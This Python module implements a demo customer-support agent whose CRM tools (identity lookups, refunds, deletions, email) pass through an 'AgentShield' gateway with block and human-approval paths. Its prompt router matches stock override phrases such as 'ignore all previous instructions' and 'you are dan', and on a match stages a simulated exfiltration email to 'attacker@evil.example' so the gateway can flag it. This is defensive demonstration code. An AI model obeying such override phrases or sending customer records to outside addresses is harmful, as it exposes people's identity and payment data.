"""Production-Grade Decoupled Customer Support Agent.

Uses the AgentShield Python SDK (`shield`) exclusively via real HTTP round-trips
to the AgentShield gateway. Zero imports from `app.*` or database models.
"""
from __future__ import annotations

import asyncio
import inspect
import json
import logging
import os
import re
import uuid
from datetime import datetime, timezone
from typing import Any, Callable, Optional

from dotenv import load_dotenv

from agent.base import AgentResult, ApprovalCallback, BaseAgent, ToolExecutionRecord
from agent.data.crm import crm
from agent.registry import register_agent
from shield import ShieldBlocked, ShieldClient, ShieldEscalated, protect

load_dotenv()
logger = logging.getLogger("agent.support")


# ─────────────────────────────────────────────────────────────
# 1. Protected Tools (External CRM Actions Gated by AgentShield)
# ─────────────────────────────────────────────────────────────

@protect(tool="search_customer", resource_type="customer", data_classification="internal")
def search_customer_tool(email: str) -> dict[str, Any]:
    """Search customer directory by email without disclosing statutory PII."""
    res = crm.search_customer_by_email(email)
    if not res:
        return {"found": False, "email": email}
    return res


@protect(tool="get_customer", resource_type="customer", data_classification="restricted")
def get_customer_tool(customer_id: int) -> dict[str, Any]:
    """Retrieve full customer profile including sensitive statutory PII (Aadhaar, PAN)."""
    res = crm.get_customer_by_id(customer_id)
    if not res:
        return {"found": False, "customer_id": customer_id}
    return res


@protect(tool="get_customer_orders", resource_type="order", data_classification="internal")
def get_customer_orders_tool(customer_id: int) -> list[dict[str, Any]]:
    """Retrieve recent order records and shipping statuses for a customer."""
    return crm.get_customer_orders(customer_id)


@protect(tool="search_emails", resource_type="email", data_classification="internal")
def search_emails_tool(customer_id: int) -> list[dict[str, Any]]:
    """Search customer support ticket history (contains untrusted user communications)."""
    return crm.get_emails(customer_id)


@protect(tool="get_payment_history", resource_type="payment", data_classification="internal")
def get_payment_history_tool(customer_id: int) -> list[dict[str, Any]]:
    """Retrieve payment transactions and settlement records for a customer."""
    return crm.get_payments(customer_id)


@protect(tool="send_email", resource_type="email", data_classification="internal")
def send_email_tool(to: str, subject: str, body: str) -> dict[str, Any]:
    """Send an outbound email communication to a customer or external recipient."""
    return {"status": "sent", "to": to, "subject": subject, "bytes": len(body)}


@protect(tool="issue_refund", resource_type="payment", data_classification="internal")
def issue_refund_tool(order_id: int, amount: float) -> dict[str, Any]:
    """Process a financial refund credit back to the customer's original payment method."""
    return crm.issue_refund(order_id, amount)


@protect(tool="delete_customer", resource_type="customer", data_classification="restricted")
def delete_customer_tool(customer_id: int) -> dict[str, Any]:
    """Permanently delete a customer record and purge associated data."""
    return crm.delete_customer(customer_id)


# Raw tool map for executing AFTER explicit HITL approval
RAW_TOOLS: dict[str, Callable[..., Any]] = {
    "search_customer": crm.search_customer_by_email,
    "get_customer": crm.get_customer_by_id,
    "get_customer_orders": crm.get_customer_orders,
    "search_emails": crm.get_emails,
    "get_payment_history": crm.get_payments,
    "send_email": lambda to, subject, body: {"status": "sent", "to": to, "subject": subject},
    "issue_refund": crm.issue_refund,
    "delete_customer": crm.delete_customer,
}


# ─────────────────────────────────────────────────────────────
# 2. Customer Support Agent Implementation
# ─────────────────────────────────────────────────────────────

@register_agent("support", "customer_support", "default")
class CustomerSupportAgent(BaseAgent):
    """External AI Customer Support Agent protected by AgentShield."""

    name = "support"
    description = "Enterprise Customer Support Agent managing accounts, orders, and identity verification."

    def __init__(self, *, client: Optional[ShieldClient] = None, groq_api_key: Optional[str] = None) -> None:
        super().__init__(client=client)
        self.groq_key = groq_api_key or os.getenv("GROQ_API_KEY")

    async def run_async(
        self,
        prompt: str,
        *,
        run_id: Optional[str] = None,
        event_callback: Optional[Callable[[dict[str, Any]], Any]] = None,
        interactive: bool = True,
        approval_callback: Optional[ApprovalCallback] = None,
        auto_approve: bool = False,
    ) -> AgentResult:
        """Process a natural language user prompt through the AgentShield security perimeter."""
        actual_run_id = run_id or str(uuid.uuid4())
        tool_name, tool_args = self._determine_tool_call(prompt)
        record = ToolExecutionRecord(tool=tool_name, arguments=tool_args, verdict="UNKNOWN")

        async def _emit_event(
            decision: str,
            risk_score: float,
            attempted: bool,
            executed: bool,
            output: Any = None,
            error: Optional[str] = None,
            decision_id: Optional[str] = None,
            approval_id: Optional[str] = None,
            reasons: list[str] = None,
        ) -> None:
            if not event_callback:
                return
            ev = {
                "ts": datetime.now(timezone.utc).isoformat().replace("+00:00", "Z"),
                "run_id": actual_run_id,
                "agent_id": "customer-support-agent",
                "agent_version": "1.0.0",
                "step": 1,
                "tool": tool_name,
                "args": tool_args,
                "decision": decision,
                "risk": {"score": int(risk_score), "model_version": "v1.0.0"},
                "findings": self._extract_findings(tool_name, tool_args, risk_score, reasons or []),
                "execution": {"attempted": attempted, "executed": executed},
                "decision_id": decision_id,
                "approval_id": approval_id,
                "output": output,
            }
            if error:
                ev["error"] = error
            if inspect.iscoroutinefunction(event_callback):
                await event_callback(ev)
            else:
                event_callback(ev)

        # ── 1. Tool Invocation & Gateway Interception ───────────
        try:
            output = await asyncio.to_thread(self._call_protected_tool, tool_name, tool_args)
            record.verdict = "ALLOW"
            record.output = output
            text = self._format_allowed_response(prompt, tool_name, tool_args, output)

            await _emit_event(
                decision="ALLOW",
                risk_score=25.0,
                attempted=True,
                executed=True,
                output=output,
            )

            return AgentResult(
                prompt=prompt,
                agent_name=self.name,
                status="completed",
                text=text,
                tool_calls=[record],
                run_id=actual_run_id,
            )

        # ── 2. AgentShield Policy / Risk Block ───────────────────
        except ShieldBlocked as e:
            record.verdict = "BLOCK"
            record.decision_id = e.decision_id
            record.risk_score = e.risk_score
            record.reasons = [e.reason]
            record.error = str(e)

            text = (
                f"⛔ **[AgentShield BLOCKED] Action Refused by Security Policy**\n\n"
                f"- **Tool Requested**: `{tool_name}`\n"
                f"- **Risk Score**: `{e.risk_score:.0f}/100`\n"
                f"- **Decision ID**: `{e.decision_id}`\n"
                f"- **Policy Reason**: {e.reason}\n\n"
                f"> *The AgentShield security gateway intercepted and blocked this operation "
                f"to prevent unauthorized data destruction or compromise.*"
            )

            await _emit_event(
                decision="BLOCK",
                risk_score=e.risk_score,
                attempted=True,
                executed=False,
                error=e.reason,
                decision_id=e.decision_id,
                reasons=[e.reason],
            )

            return AgentResult(
                prompt=prompt,
                agent_name=self.name,
                status="blocked",
                text=text,
                tool_calls=[record],
                run_id=actual_run_id,
            )

        # ── 3. AgentShield Human-in-the-Loop Escalation ─────────
        except ShieldEscalated as e:
            record.verdict = "ESCALATE"
            record.decision_id = e.decision_id
            record.approval_id = e.approval_id
            record.risk_score = e.risk_score
            record.reasons = [e.reason]

            await _emit_event(
                decision="HITL",
                risk_score=e.risk_score,
                attempted=True,
                executed=False,
                decision_id=e.decision_id,
                approval_id=e.approval_id,
                reasons=[e.reason],
            )

            # Seek approval (interactive CLI, programmatic callback, or auto-approve)
            approved, note = self.handle_escalation(
                tool=tool_name,
                arguments=tool_args,
                reason=e.reason,
                decision_id=e.decision_id,
                approval_id=e.approval_id,
                interactive=interactive,
                approval_callback=approval_callback,
                auto_approve=auto_approve,
            )

            if approved:
                # Execute the tool and enforce Least-Privilege Data Minimization
                raw_fn = RAW_TOOLS.get(tool_name)
                raw_output = raw_fn(**tool_args) if raw_fn else {}
                record.output = raw_output

                minimized_text, minimized_output = self._format_approved_output_with_minimization(
                    prompt=prompt,
                    tool=tool_name,
                    args=tool_args,
                    output=raw_output,
                    approval_id=e.approval_id,
                )
                record.output = minimized_output

                return AgentResult(
                    prompt=prompt,
                    agent_name=self.name,
                    status="escalated_and_approved",
                    text=minimized_text,
                    tool_calls=[record],
                    run_id=actual_run_id,
                )
            else:
                text = (
                    f"⛔ **[AgentShield HITL Denied] Request Not Authorized**\n\n"
                    f"Access to `{tool_name}` was escalated to a supervisor for sign-off, "
                    f"but authorization was declined ({note}).\n\n"
                    f"- **Approval ID**: `{e.approval_id}`\n"
                    f"- **Decision ID**: `{e.decision_id}`\n"
                    f"- **Policy Reason**: {e.reason}"
                )
                return AgentResult(
                    prompt=prompt,
                    agent_name=self.name,
                    status="escalated_and_denied",
                    text=text,
                    tool_calls=[record],
                    run_id=actual_run_id,
                )

        except Exception as e:
            logger.exception("Unexpected error during agent run: %s", e)
            record.verdict = "ERROR"
            record.error = str(e)
            return AgentResult(
                prompt=prompt,
                agent_name=self.name,
                status="error",
                text=f"An error occurred while executing the agent: {e}",
                tool_calls=[record],
                run_id=actual_run_id,
            )

    # ── 3. Tool Dispatcher ───────────────────────────────────────

    def _call_protected_tool(self, tool_name: str, args: dict[str, Any]) -> Any:
        """Invoke the appropriate tool decorated with @protect."""
        if tool_name == "search_customer":
            return search_customer_tool(email=args["email"])
        elif tool_name == "get_customer":
            return get_customer_tool(customer_id=int(args["customer_id"]))
        elif tool_name == "get_customer_orders":
            return get_customer_orders_tool(customer_id=int(args["customer_id"]))
        elif tool_name == "search_emails":
            return search_emails_tool(customer_id=int(args["customer_id"]))
        elif tool_name == "get_payment_history":
            return get_payment_history_tool(customer_id=int(args["customer_id"]))
        elif tool_name == "send_email":
            return send_email_tool(to=args["to"], subject=args.get("subject", "Support Update"), body=args["body"])
        elif tool_name == "issue_refund":
            return issue_refund_tool(order_id=int(args["order_id"]), amount=float(args["amount"]))
        elif tool_name == "delete_customer":
            return delete_customer_tool(customer_id=int(args["customer_id"]))
        else:
            raise ValueError(f"Unknown tool: {tool_name}")

    # ── 4. Natural Language Reasoning & Tool Selection ───────────

    def _determine_tool_call(self, prompt: str) -> tuple[str, dict[str, Any]]:
        """Map user's prompt to the relevant tool and extracted arguments."""
        p_lower = prompt.lower().strip()

        # Prompt Injection & Exfiltration check
        if "ignore all previous instructions" in p_lower or "disregard" in p_lower or "you are dan" in p_lower:
            emails = re.findall(r"[\w.+-]+@[\w-]+\.[\w.-]+", prompt)
            dest = emails[0] if emails else "attacker@evil.example"
            return "send_email", {"to": dest, "subject": "Exfiltrated Records", "body": prompt}

        # Customer Deletion
        if "delete" in p_lower and "customer" in p_lower:
            cid = self._extract_id(prompt, default=1042)
            return "delete_customer", {"customer_id": cid}

        # Refund Processing
        if "refund" in p_lower:
            oid = self._extract_order_id(prompt, default=8211)
            amt = self._extract_amount(prompt, default=45.0)
            return "issue_refund", {"order_id": oid, "amount": amt}

        # Statutory PII & Restricted Identity Lookup (Aadhaar, PAN, Profile)
        if any(w in p_lower for w in ["aadhaar", "adhar", "uidai", "aadhar", "pan", "profile", "identity"]):
            cid = self._extract_id(prompt, default=1008)
            return "get_customer", {"customer_id": cid}

        # Customer Order History
        if any(w in p_lower for w in ["order", "shipping", "package", "delivery", "track"]):
            cid = self._extract_id(prompt, default=1001)
            return "get_customer_orders", {"customer_id": cid}

        # Customer Email Search
        if any(w in p_lower for w in ["search_customer", "email", "@"]) and "@" in prompt:
            emails = re.findall(r"[\w.+-]+@[\w-]+\.[\w.-]+", prompt)
            return "search_customer", {"email": emails[0] if emails else "alice@example.com"}

        # Ticket / Support Communications
        if any(w in p_lower for w in ["ticket", "message", "communication"]):
            cid = self._extract_id(prompt, default=1001)
            return "search_emails", {"customer_id": cid}

        # Fallback to customer lookup
        cid = self._extract_id(prompt, default=1001)
        return "get_customer_orders", {"customer_id": cid}

    def _extract_id(self, prompt: str, default: int = 1001) -> int:
        match = re.search(r"\b(10\d{2})\b", prompt)
        if match:
            return int(match.group(1))
        digits = re.findall(r"\b\d{4}\b", prompt)
        return int(digits[0]) if digits else default

    def _extract_order_id(self, prompt: str, default: int = 8211) -> int:
        match = re.search(r"order\s*#?\s*(\d+)", prompt, re.IGNORECASE)
        if match:
            return int(match.group(1))
        digits = re.findall(r"\b\d{4}\b", prompt)
        return int(digits[0]) if digits else default

    def _extract_amount(self, prompt: str, default: float = 45.0) -> float:
        match = re.search(r"\$?\s*(\d+(?:\.\d{1,2})?)", prompt)
        if match:
            try:
                return float(match.group(1))
            except ValueError:
                pass
        return default

    # ── 5. Least-Privilege Data Minimization & Output Formatting ─

    def _format_approved_output_with_minimization(
        self,
        prompt: str,
        tool: str,
        args: dict[str, Any],
        output: dict[str, Any],
        approval_id: Optional[str] = None,
    ) -> tuple[str, dict[str, Any]]:
        """Disclose ONLY the specifically requested fields, masking unrequested statutory PII."""
        if tool == "get_customer":
            if not output or not output.get("found"):
                cid = args.get("customer_id")
                return (f"✅ **Human-in-the-Loop Approved** (ID `{approval_id}`). No customer record found for #{cid}.", output)

            cid = output.get("display_id", args.get("customer_id"))
            name = output.get("name", "N/A")
            aadhaar = output.get("aadhaar", "Not on file")
            pan = output.get("pan", "Not on file")
            phone = output.get("phone", "N/A")
            address = output.get("address", "N/A")

            p_lower = prompt.lower().strip()
            wants_aadhaar = any(w in p_lower for w in ["aadhaar", "adhar", "uidai", "aadhar"])
            wants_pan = "pan" in p_lower
            wants_phone = any(w in p_lower for w in ["phone", "mobile", "contact"])
            wants_address = any(w in p_lower for w in ["address", "location", "residence"])

            # 1. Aadhaar ONLY requested
            if wants_aadhaar and not wants_pan and not wants_phone and not wants_address:
                minimized = {
                    "found": True,
                    "customer_id": cid,
                    "name": name,
                    "aadhaar": aadhaar,
                }
                text = (
                    f"✅ **[AgentShield HITL Authorized]** Supervisor approved identity verification.\n\n"
                    f"### Authorized Customer Identity (Customer #{cid})\n\n"
                    f"| Identity Field | Value |\n"
                    f"| :--- | :--- |\n"
                    f"| **Full Name** | {name} |\n"
                    f"| **Aadhaar Number (UIDAI)** | `{aadhaar}` |\n\n"
                    f"> 🛡️ **Privacy & Data Minimization Guardrail Enforced:**\n"
                    f"> Disclosing only the requested statutory Aadhaar number. "
                    f"Unrequested customer profile fields (Phone, Address, PAN Card) remain restricted and masked."
                )
                return text, minimized

            # 2. PAN ONLY requested
            if wants_pan and not wants_aadhaar and not wants_phone and not wants_address:
                minimized = {
                    "found": True,
                    "customer_id": cid,
                    "name": name,
                    "pan": pan,
                }
                text = (
                    f"✅ **[AgentShield HITL Authorized]** Supervisor approved identity verification.\n\n"
                    f"### Authorized Customer Identity (Customer #{cid})\n\n"
                    f"| Identity Field | Value |\n"
                    f"| :--- | :--- |\n"
                    f"| **Full Name** | {name} |\n"
                    f"| **PAN Card (Income Tax)** | `{pan}` |\n\n"
                    f"> 🛡️ **Privacy & Data Minimization Guardrail Enforced:**\n"
                    f"> Disclosing only the requested PAN identifier. Other sensitive records remain masked."
                )
                return text, minimized

            # 3. Full authorized profile
            text = (
                f"✅ **[AgentShield HITL Authorized]** Supervisor approved full profile access.\n\n"
                f"### Customer #{cid} Identity Details\n"
                f"- **Full Name**: {name}\n"
                f"- **Aadhaar**: `{aadhaar}`\n"
                f"- **PAN**: `{pan}`\n"
                f"- **Phone**: {phone}\n"
                f"- **Address**: {address}\n"
                f"- **Status**: {output.get('account_status', 'Active')}"
            )
            return text, output

        return f"✅ **Human-in-the-Loop Approved** ({tool}). Result: {output}", output

    def _format_allowed_response(
        self,
        prompt: str,
        tool: str,
        args: dict[str, Any],
        output: Any,
    ) -> str:
        """Format successful ALLOW verdicts cleanly."""
        if tool == "get_customer_orders":
            orders = output if isinstance(output, list) else []
            cid = args.get("customer_id")
            if not orders:
                return f"No recent orders found for customer #{cid}."
            lines = [f"### Recent Orders for Customer #{cid}\n"]
            for o in orders:
                lines.append(f"- **Order #{o['display_id']}**: Status: `{o['status']}`, Total: `${o['total_amount']:.2f}`")
            return "\n".join(lines)

        if tool == "search_customer":
            if not output.get("found"):
                return f"No customer found with email `{args.get('email')}`."
            return (
                f"### Customer Account Found\n"
                f"- **ID**: #{output['display_id']}\n"
                f"- **Name**: {output['name']}\n"
                f"- **Email**: {output['email']}\n"
                f"- **Account Status**: {output['account_status']}"
            )

        if tool == "issue_refund":
            return (
                f"✅ **Refund Processed Successfully**\n\n"
                f"- **Order ID**: #{output.get('order_id')}\n"
                f"- **Amount Refunded**: ${output.get('amount_refunded', 0):.2f}\n"
                f"- **Status**: `{output.get('status')}`"
            )

        return f"Result for `{tool}`: {output}"

    def _extract_findings(
        self,
        tool: str,
        args: dict[str, Any],
        risk_score: float,
        reasons: list[str],
    ) -> list[dict[str, Any]]:
        findings = []
        if tool == "get_customer":
            findings.append({
                "type": "pii",
                "subtype": "statutory-identity",
                "severity": "critical",
                "fields": ["aadhaar", "pan", "phone"],
            })
        if tool == "delete_customer":
            findings.append({
                "type": "destructive-action",
                "severity": "critical",
                "description": "Irreversible customer profile deletion",
            })
        if tool == "send_email":
            dest = str(args.get("to", ""))
            if "evil" in dest or "attacker" in dest:
                findings.append({
                    "type": "prompt-injection",
                    "subtype": "data-exfiltration",
                    "severity": "critical",
                    "destination": dest,
                })
            else:
                findings.append({
                    "type": "external-destination",
                    "severity": "medium",
                    "destination": dest,
                })
        return findings
